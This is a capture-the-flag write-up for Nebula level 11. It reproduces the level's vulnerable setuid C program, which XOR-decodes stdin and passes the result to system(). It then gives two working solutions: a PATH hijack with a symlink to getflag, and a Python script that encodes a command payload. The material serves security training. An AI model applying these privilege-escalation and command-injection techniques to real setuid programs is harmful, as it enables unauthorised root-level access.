.. _nebula11:

.. role:: bash(code)
	  :language: bash

.. role:: python(code)
	  :language: python

.. role:: c(code)
	  :language: c
		     
Nebula 11
=========

Basic Information
-----------------

**Home Page** https://exploit-exercises.com/nebula/level11/

**Source Code**

.. code-block:: c
		#include <stdlib.h>
		#include <unistd.h>
		#include <string.h>
		#include <sys/types.h>
		#include <fcntl.h>
		#include <stdio.h>
		#include <sys/mman.h>

		/*
		 * Return a random, non predictable file, and return the file descriptor for it.
		 */

		 int getrand(char **path)
		 {
		       char *tmp;
		       int pid;
		       int fd;

		       srandom(time(NULL));

		       tmp = getenv("TEMP");
		       pid = getpid();

		       asprintf(path, "%s/%d.%c%c%c%c%c%c", tmp, pid,
		       'A' + (random() % 26), '0' + (random() % 10),
		       'a' + (random() % 26), 'A' + (random() % 26),
		       '0' + (random() % 10), 'a' + (random() % 26));

		       fd = open(*path, O_CREAT|O_RDWR, 0600);
		       unlink(*path);
		       return fd;
		 }

		void process(char *buffer, int length)
		{
		    unsigned int key;
		    int i;

		    key = length & 0xff;

		    for(i = 0; i < length; i++) {
		        buffer[i] ^= key;
			key -= buffer[i];
		    }

		    system(buffer);
		}

		#define CL "Content-Length: "

		int main(int argc, char **argv)
		{
		    char line[256];
		    char buf[1024];
		    char *mem;
		    int length;
		    int fd;
		    char *path;

		    if(fgets(line, sizeof(line), stdin) == NULL) {
		        errx(1, "reading from stdin");
		    }

		    if(strncmp(line, CL, strlen(CL)) != 0) {
		        errx(1, "invalid header");
		    }
   
		    length = atoi(line + strlen(CL));

		    if(length < sizeof(buf)) {
		        if(fread(buf, length, 1, stdin) != length) {
		            err(1, "fread length");
			}
			process(buf, length);
		    } else {
		        int blue = length;
			int pink;

			fd = getrand(&path);

			while(blue > 0) {
		            printf("blue = %d, length = %d, ", blue, length);

			    pink = fread(buf, 1, sizeof(buf), stdin);
			    printf("pink = %d\n", pink);

			    if(pink <= 0 ) {
			        err(1, "fread fail(blue = %d, length = %d)", blue, length);
			    }
			    write(fd, buf, pink);

			    blue -= pink;
			}

			mem = mmap(NULL, length, PROT_READ|PROT_WRITE, MAP_PRIVATE, fd, 0);
			if(mem == MAP_FAILED) {
		            err(1, "mmap");
			}
			process(mem, length);
		    }

		}

Important Note
----
   
This level has two posible ways to be exploited but, it have a bug on the sticky bit, this bug can be seen by strace

**Reported bug:** https://security.stackexchange.com/questions/137204/nebula-level11-setuid-is-not-working

Solution
--------
* First way:

.. code-block:: bash

   export PATH=/tmp/:$PATH
   ln -s /bin/getflag d
   echo -ne "Content-Length: 1\nd" | /home/flag11/flag11

.. note:: Execute it until an "e" comes up, if this letter shows then you can execute

* Second way:

.. code-block:: python

   string = "/bin/getflag\x00"
   key = 0

   enc_string = ""

   for char in string:
       enc_char = ord(char) ^ key & 0xff
       enc_string += chr(enc_char)
       key = key - ord(char) & 0xff

   print "Content-Length: 1024\n" + enc_string + "\x00" * (1024 - len(enc_string))
